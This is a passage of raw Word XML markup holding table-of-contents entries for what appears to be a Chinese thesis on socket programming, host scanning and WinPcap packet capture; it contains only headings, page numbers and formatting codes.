        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="105" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="106" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522617"</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2.3</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SOCKET编程原理</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522617 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="107" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="04A16BA8" w14:textId="605FE40F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="108" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="109" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522618"</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2.3.1</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Socket的结构组成</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522618 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="110" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3FABAC8D" w14:textId="300BAD76" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="111" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="112" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522619"</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2.3.2</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Socket网络编程技术主机扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522619 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="113" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3807709E" w14:textId="212B9438" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="114" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="115" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522620"</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2.4</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WinPcap简介及原理</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522620 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="116" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10783D9C" w14:textId="3F14D334" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="117" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="118" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522621"</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2.4.1</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WinPcap简介</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522621 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="119" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FE045D6" w14:textId="1D1EF52F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="120" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="121" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522622"</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2.4.2</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基于WindPcap可以开发的网络应用程序</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522622 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="122" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09E41D7A" w14:textId="4B59B667" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="123" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="124" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522623"</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2.4.3</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基于WindPcap中主要函数的功能</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522623 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="125" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>11</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F4B992E" w14:textId="5DBA324C" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="126" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="127" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522624"</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2.4.4</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WinPcap实现数据包捕获与分析的流程</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522624 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="128" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>11</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6240349A" w14:textId="45F96B8F" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="129" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="130" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522625"</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2.5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>本章小结</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522625 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="131" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>12</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="542EEF4E" w14:textId="5DCE9A30" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="132" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="133" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522626"</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3.</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概要设计</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522626 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="134" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="279F6ABD" w14:textId="7CB4C8CB" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="135" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="136" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522627"</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3.1</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设计初衷</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522627 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="137" w:author="yong li" w:date="2017-05-14T10:54:00Z">
